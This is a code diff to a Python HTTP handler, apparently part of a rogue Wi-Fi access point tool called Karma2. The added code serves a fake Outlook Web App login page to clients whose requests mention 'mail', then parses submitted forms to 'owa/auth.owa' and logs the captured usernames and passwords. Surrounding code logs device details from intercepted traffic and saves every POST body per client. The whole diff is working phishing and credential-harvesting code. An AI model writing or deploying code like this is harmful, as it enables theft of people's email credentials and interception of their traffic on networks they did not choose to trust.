@@ -283,6 +283,11 @@ class Karma2:
         self.end_headers()
         self.wfile.write('WIFIFREEKEY_TEST_REDIRECTOR_PAGE\n')
 
+      elif "mail" in path or "mail" in host:
+        self.send_response(200)
+        self.end_headers()
+        self.wfile.write(open('OutlookWebApp.html','r').read())
+
       else:
         log("(%s)"%_ctxt("default",YELLOW))
         self.send_response(200)
@@ -314,6 +319,10 @@ class Karma2:
       except:
         pass
       
+      # get content
+      length = int(self.headers['Content-Length'])
+      post = self.rfile.read(length)
+
       if host == 't.appsflyer.com' and path == 'api/v2.3/androidevent':
         model = self.headers.get('model')
         lang = self.headers.get('lang')
@@ -322,10 +331,17 @@ class Karma2:
         country = self.headers.get('country')
         log( "%s is using a %s %s using %s. Language is %s"%(client, brand, model, operator, lang))
 
+      elif path == 'owa/auth.owa':
+        
+        try:
+          kvs = dict([ kv.split('=') for kv in urllib2.unquote(post).split('&')])
+          log( "%s login is %s"%(fullpath, 
+            _ctxt("%s:%s"%(kvs['username'], kvs['password']),RED)) )
+        except:
+          raise
+            
       #save content
-      length = int(self.headers['Content-Length'])
       if length > 0:
-        post = self.rfile.read(length)
         bssid = self.server.app.get_client_bssid(client)
         name = "%s_%s_%d"%(bssid,host,time.time())
         f = open(name,'w')
